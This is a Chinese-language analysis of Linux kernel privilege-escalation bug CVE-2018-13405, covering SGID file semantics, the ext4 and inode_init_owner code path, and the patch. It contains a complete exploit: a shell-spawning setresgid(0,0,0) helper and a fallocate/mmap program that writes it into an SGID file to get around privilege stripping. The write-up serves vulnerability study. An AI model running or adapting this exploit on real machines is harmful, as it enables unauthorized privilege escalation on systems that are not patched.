@@ -1,0 +1,202 @@
+# Linux 内核提权 CVE-2018-13405 分析
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+**author：OK5y@GearTeam**
+## 漏洞简介
+Linux 内核在具有 setgid 权限的目录中创建文件时处理不当，导致可以创建具有 setgid
+权限的空文件，随后通过巧妙利用系统调用可以随意更改文件内容，从而构造出具有 setgid 权限的可执行文件，实现越权。
+## 背景知识
+linux 下文件权限的设定对象可以分为 3
+类：属主（owner）、属组（group）、其他人（other）。对于每一个对象又可以分出三种权限读、写、执行，分别对应 r、w、x。
+对于文件而言，读属性（read）表示可以查看文件的内容，写属性（write）表示可以编辑、增加或者是修改文件的内容（不包含删除），执行属性（execute）表示用户可以执行该文件。对于目录而言，读属性（read）表示可以读取目录结构列表，写属性（write）表示可以对目录结构进行更改（创建、删除文件等），执行属性（execute）表示用户有权进入该目录。
+除了这些操作权限之外，还有三种特殊权限，称为 Linux 的附加权限。包括 SET 位权限（SUID，SGID）和粘滞位权限（SBIT）。 SUID 和
+SGID 作用于文件时的功能类似（SUID只能作用于文件，SGID可以作用于目录），当用户执行拥有
+SUID（SGID）权限的文件时，执行期间，程序的属主（属组）变为该文件的属主（属组）。通过这种方式可以让没有特权的用户在需要执行需要特权的任务时，在程序运行期间短暂的拥有特权用户的权限。当目录拥有
+SGID
+权限时，用户在目录中的有效组变为该目录的属组，如果用户拥有写权限，则在目录中新建的文件时，文件的默认属组为该目录的属组。粘滞位主要作用于目录，当目录设置粘滞位后，即使用户拥有目录的写权限，也无法删除该目录中其他用户的文件数据。
+Linux 支持多种不同的文件系统，为了实现这一目的，Linux 隐去各种文件系统之间的细节，抽象出了一个统一的、虚拟的文件系统 VFS（Virtual
+File System）。VFS
+将文件分成两部分，文件本身的属性，文件访问权限、大小、拥有者、创建时间、访问时间等与文件的数据分开，抽象出来存储在索引节点对象（inode）中。其中几个特殊值如下（include/linux/fs.h:579-680）：
+    struct inode {
+        umode_t            i_mode;
+        ...
+        kuid_t            i_uid;
+        kgid_t            i_gid;
+        ...
+        const struct inode_operations   *i_op;
+        struct super_block  *i_sb;
+        ...
+    }
+其中 i_mode 保存的是文件的访问权限，i_uid、i_gid 则分别保存文件所有者的 UID 和 GID。i_op 指向 inode
+的操作函数表（inode_operations 结构体，该结构体保存了所有针对 inode
+的操作函数，include/linux/fs.h:1634-1668）。i_sb 指向了该 inode 相关的超级块。
+    struct inode_operations {
+        ...
+        int (*readlink) (struct dentry *, char __user *,int);
+        void (*put_link) (struct inode *, void *);
+        int (*create) (struct inode *,struct dentry *, umode_t, bool);
+        ...
+    }
+## 漏洞分析
+调试环境为 ubuntu 16.04，kernel 版本 4.4.0 漏洞发生在 fs/inode.c:inode_init_owner() 函数中。在使用
+open 创建新文件时会调用这个函数。我们知道对目录拥有写权限，才可以在其中创建文件。所以创建文件的函数定义在针对目录的操作函数表中。在 ext4
+文件系统中的定义如下（fs/ext4/namei.c:3831-3853）：
+    const struct inode_operations ext4_dir_inode_operations = {
+        .create        = ext4_create,
+        ...
+    };
+ext4_create 的实现如下（fs/ext4/namei.c:2423-2462），该函数的主要功能就是为新创建的文件建立 inode。
+    /*
+     * By the time this is called, we already have created
+     * the directory cache entry for the new file, but it
+     * is so far negative - it has no inode.
+     ...
+     */
+    static int ext4_create(struct inode *dir, struct dentry *dentry, umode_t mode,
+                   bool excl)
+    {
+        ...
+    retry:
+        inode = ext4_new_inode_start_handle(dir, mode, &dentry->d_name, 0,
+                            NULL, EXT4_HT_DIR, credits);   // 创建 inode 的主要函数
+        ...
+    }
+ext4_new_inode_start_handle 是一个宏定义（fs/ext4/ext4.h:2398-2401）：
+    #define ext4_new_inode_start_handle(dir, mode, qstr, goal, owner, \
+                        type, nblocks)            \
+        __ext4_new_inode(NULL, (dir), (mode), (qstr), (goal), (owner), \
+                 (type), __LINE__, (nblocks))
+__ext4_new_inode 定义在 fs/ext4/ialloc.c:730-1136，是创建 inode 的主要函数。
+    struct inode *__ext4_new_inode(handle_t *handle, struct inode *dir,
+                       umode_t mode, const struct qstr *qstr,
+                       __u32 goal, uid_t *owner, int handle_type,
+                       unsigned int line_no, int nblocks)
+    {
+        struct super_block *sb; 
+        ...
+        sb = dir->i_sb;
+        ...
+        if (owner) {
+            inode->i_mode = mode;
+            i_uid_write(inode, owner[0]);
+            i_gid_write(inode, owner[1]);
+        } else if (test_opt(sb, GRPID)) {
+            inode->i_mode = mode;
+            inode->i_uid = current_fsuid();
+            inode->i_gid = dir->i_gid;
+        } else
+            inode_init_owner(inode, dir, mode);
+        ...
+    }
+其中 owner 来自于调用 ext4_new_inode_start_handle 时的第5个参数 NULL。test_opt
+用来测试该文件系统的超级块信息（fs/ext4/ext4.h:1070-1071），判断文件系统挂载时的挂载标志，EXT4_MOUNT_GRPID
+判断是否以目录的属组来创建文件，默认并未设置，所以会调用 inode_init_owner 函数。
+    #define test_opt(sb, opt)       (EXT4_SB(sb)->s_mount_opt & \
+                         EXT4_MOUNT_##opt)
+来看一下 inode_init_owner 的实现：
+    /**
+     * inode_init_owner - Init uid,gid,mode for new inode according to posix standards
+     * @inode: New inode
+     * @dir: Directory inode
+     * @mode: mode of the new inode
+     */
+    void inode_init_owner(struct inode *inode, const struct inode *dir,
+                umode_t mode)
+    {
+        inode->i_uid = current_fsuid();
+        if (dir && dir->i_mode & S_ISGID) {
+            inode->i_gid = dir->i_gid;
+            if (S_ISDIR(mode))
+                mode |= S_ISGID;
+        } else
+            inode->i_gid = current_fsgid();
+        inode->i_mode = mode;
+    }
+    EXPORT_SYMBOL(inode_init_owner);
+该函数的主要作用是来初始化新建 inode 的 uid、gid 和 i_mode 属性，首先将 inode 的 uid 设置为进程
+uid，随后如果目录设置了 SGID，则将 inode 的 gid 设置为目录的 gid。如果新建的 inode 为目录的话，会默认为 mode 添加上
+SGID，并将其赋值给文件。但是对于文件则未作处理，所以如果初始 mode 即带有 SGID 权限的话，最终可以成功创建一个具有 SGID 权限的空文件。
+调用栈如下图：
+来看一下如下示例：
+    #include 
+    void main(void) {
+            open("dir/file", O_RDONLY|O_CREAT, 02755);
+    }
+运行结果如图所示，可以看到成功创建了一个0字节的 sgid 文件。
+我们已经成功创建了一个空的 sgid 文件，但是这对我们而言，作用不大，接下来研究如何向该文件中写入数据。 如果使用 write
+系统调用直接写入文件，虽然可以成功写入，但是 write 会触发 killpriv 机制，导致文件的 sgid 权限被去除。原因在于 write
+在写入文件之前会调用 file_remove_privs，该函数会判断文件的特殊权限，如果文件拥有 suid 标志或者同时有 sgid 和写权限，函数会调用
+__remove_privs 将这些权限去除。如下示例：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    int main(void) {
+            char *buf = "It's a test!\n";
+            int fd = open("dir/file", O_RDWR|O_CREAT|O_EXCL, 02755);
+            write(fd, buf, strlen(buf));
+            close(fd);
+    }
+运行结果如图：
+可以使用 fallocate 和 mmap 系统调用实现我们的目的，首先调用 fallocate 扩大文件大小，随后调用 mmap
+将其影射到进程地址空间。对 mmap 后文件的写操作不会清除文件的特殊权限。 完整利用如下：
+    // demo2.c
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    void main()
+    {
+        setresgid(0, 0, 0);
+        system("/bin/sh");
+    }
+    // fallocate.c
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    int main(void) {
+        int src_fd = open("/home/al3x/cve-2018-13405/demo2", O_RDONLY);
+        if (src_fd == -1)
+            err(1, "open 2");
+        struct stat src_stat;
+        if (fstat(src_fd, &src_stat))
+            err(1, "fstat");
+        int src_len = src_stat.st_size;
+        char *src_mapping = mmap(NULL, src_len, PROT_READ, MAP_PRIVATE, src_fd, 0);
+        if (src_mapping == MAP_FAILED)
+            err(1, "mmap 2");
+        int fd = open("dir/file", O_RDWR|O_CREAT|O_EXCL, 02755);
+        if (fd == -1)
+            err(1, "open");
+        if (fallocate(fd, 0, 0, src_len))
+            err(1, "fallocate");
+        char *mapping = mmap(NULL, src_len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+        if (mapping == MAP_FAILED)
+            err(1, "mmap");
+        memcpy(mapping, src_mapping, src_len);
+        munmap(mapping, src_len);
+        close(fd);
+        close(src_fd);
+        execl("./dir/file", "", NULL);
+        err(1, "execl");
+    }
+运行效果如下图所示：
+## 补丁分析
+漏洞补丁如下:
+可以看到，在原有的基础上又加了添加了一条判断语句，如果符合则去除 S_ISGID 标志。 首先判断 mode 是否同时包含 GID 和组执行。随后调用
+in_group_p 函数。该函数判断目录的属组是否在进程的文件系统或任何补充组中。最后调用 capable_wrt_inode_uidgid
+检测当前进程是否设置了 CAP_FSETID 标志，同时检测目录的 uid 和 gid 是否映射到当前用户的命名空间中。CAP_FSETID
+标志有两条作用：1. 当文件被编辑时不会去除其 suid 和 sgid 权限；2. 为 gid 与调用进程的文件系统或任何补充组都不匹配的文件设置 sgid
+标志。 如果上述三条条件同时满足，则去除新建文件的 S_ISGID 标志
+## 参考文献
+[Linux/Ubuntu: other users’ coredumps can be read via setgid directory and
+killpriv bypass](https://bugs.chromium.org/p/project-zero/issues/detail?id=1611)
+[Linux内核写文件过程](http://ilinuxkernel.com/?p=1585)[Linux Programmer’s
+Manual](http://man7.org/linux/man-pages/man7/capabilities.7.html)
